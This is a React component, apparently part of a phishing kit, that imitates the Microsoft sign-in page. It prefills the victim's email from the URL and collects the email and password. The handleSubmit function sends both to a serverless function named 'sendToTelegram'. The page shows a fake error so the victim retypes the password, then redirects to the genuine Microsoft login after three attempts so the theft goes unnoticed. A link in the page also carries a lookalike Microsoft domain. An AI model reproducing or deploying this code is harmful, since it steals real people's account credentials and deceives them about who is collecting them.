import React, { useState, useEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
  const [showDiv2, setShowDiv2] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [msg, setMsg] = useState('');
  const [count, setCount] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    // Check for email in URL hash
    const emailFromHash = window.location.hash.substr(1);
    if (emailFromHash) {
      setEmail(emailFromHash);
      const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      
      if (filter.test(emailFromHash)) {
        setShowDiv2(true);
      } else {
        setError('That Microsoft account doesn\'t exist. Enter a different account');
      }
    }
  }, []);

  const handleNext = () => {
    const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    
    if (!filter.test(email)) {
      setError('That Microsoft account doesn\'t exist. Enter a different account');
      return false;
    }
    
    setError('');
    setShowDiv2(true);
  };

  const handleBack = () => {
    setMsg('');
    setShowDiv2(false);
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();

    // Calculate new count synchronously and update state
    const newCount = count + 1;
    setCount(newCount);

    if (newCount >= 3) {
      window.location.replace("http://login.microsoftonline.com");
      return;
    }

    setIsSubmitting(true);

    // Perform async work here (not inside setCount updater)
    try {
      const response = await fetch('/.netlify/functions/sendToTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          password: password,
          detail: '',
        }),
      });

      const data = await response.json();

      if (data.signal === 'ok') {
        setMsg(data.msg);
      } else {
        setMsg(data.msg);
      }
    } catch (error) {
      setMsg("Please try again later");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div 
      style={{
        backgroundImage: "url('images/bg5.png')",
        backgroundSize: 'cover',
        backgroundRepeat: 'no-repeat',
        backgroundAttachment: 'fixed',
        minHeight: '100vh'
      }}
    >
      <div className="container-fluid p-0">
        <div className="container">
          <div className="row my-5 py-5">
            <div className="col-lg-6 mx-auto">
              {!showDiv2 ? (
                <div className="m-5 p-4 bg-white" id="div1">
                  <img src="images/microsoft_logo.svg" className="img-fluid" alt="Microsoft Logo" />
                  <br /><br />
                  <span className="h5">Sign In</span><br />
                  {error && (
                    <span id="error" className="text-danger">{error}</span>
                  )}
                  <div className="form-group mt-2">
                    <input 
                      type="email" 
                      name="email" 
                      className="form-control" 
                      id="email" 
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        setError('');
                      }}
                      placeholder="Email, phone or skype" 
                      style={{
                        borderRight: 'none',
                        borderLeft: 'none',
                        borderTop: 'none'
                      }}
                    />
                  </div>
                  <p>No account? <a href="https://signup.live.com/signup?ru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26response_type%3dcode%26client_id%3d51483342-085c-4d86-bf88-cf50c7252078%26scope%3dopenid%2bprofile%2bemail%2boffline_access%26response_mode%3dform_post%26redirect_uri%3dhttps%253a%252f%252flogin.microsoftonline.com%252fcommon%252ffederation%252foauth2%26state%3drQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEXtk_X7dhr6zr3uYXtw5zqiyexcgZn5NZBla5ilGZsHH6FxgZXzAy3mIS9C9K90wJL3ZLTUktSizJzM-7wCLwioXHgNmKg4NLgEGCQYHhBwvjIlagrZymylOOHFzvusZeeda6cxYMp1j1o6q8LfJ9zTO9Ukz9wyrdfC1NS3MtLDxy87y00wyKwoOKQjIDSsrKjAJCA20trAwnsAlNYGM6xcbwgY2xg53hACfjLS4RIwNDS10DI10DEwUDcytTCysjsygA0%26estsfed%3d1%26lw%3d1%26fl%3deasi2%26fci%3dhttps%253a%252f%252fportal.microsoftonline.com.orgid.com%26mkt%3dEN-US%26uaid%3daee73feabdb0451dbd83e8dac30924a3&mkt=EN-US&uiflavor=web&lw=1&fl=easi2&client_id=51483342-085c-4d86-bf88-cf50c7252078&uaid=aee73feabdb0451dbd83e8dac30924a3&suc=https%3a%2f%2fportal.microsoftonline.com.orgid.com&lic=1">Create one!</a></p>
                  <p><a href="#">Sign in with a security key</a></p>
                  <p><a href="#">sign in options</a></p>
                  <div className="text-right">
                    <button 
                      className="btn rounded-0 text-white px-4" 
                      onClick={handleNext}
                      style={{ backgroundColor: '#0066BA' }}
                    >
                      Next
                    </button>
                  </div>
                </div>
              ) : (
                <div className="m-5 p-4 bg-white" id="div2">
                  <form id="contact" onSubmit={handleSubmit}>
                    <img src="images/microsoft_logo.svg" className="img-fluid" alt="Microsoft Logo" />
                    <br /><br />
                    <i className="fas fa-arrow-left" onClick={handleBack} style={{ cursor: 'pointer' }}></i>
                    &nbsp;<span id="emailch">{email}</span><br />
                    {msg && (
                      <span id="msg" className="text-danger">{msg}</span>
                    )}
                    <br />
                    <span className="h5">Password</span>
                    <div className="form-group mt-2">
                      <input 
                        type="password" 
                        name="password" 
                        className="form-control" 
                        id="password" 
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Enter Password" 
                        style={{
                          borderRight: 'none',
                          borderLeft: 'none',
                          borderTop: 'none'
                        }}
                      />
                    </div>
                    <p>No account? <a href="#">Create one!</a></p>
                    <p><a href="#">Sign in with a security key</a></p>
                    <p><a href="#">sign in options</a></p>
                    <div className="text-right">
                      <button 
                        className="btn rounded-0 text-white px-4" 
                        type="submit"
                        disabled={isSubmitting}
                        style={{ backgroundColor: '#0066BA' }}
                      >
                        {isSubmitting ? 'Verifying...' : 'Login'}
                      </button>
                    </div>
                  </form>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RealOAuthRedirect;
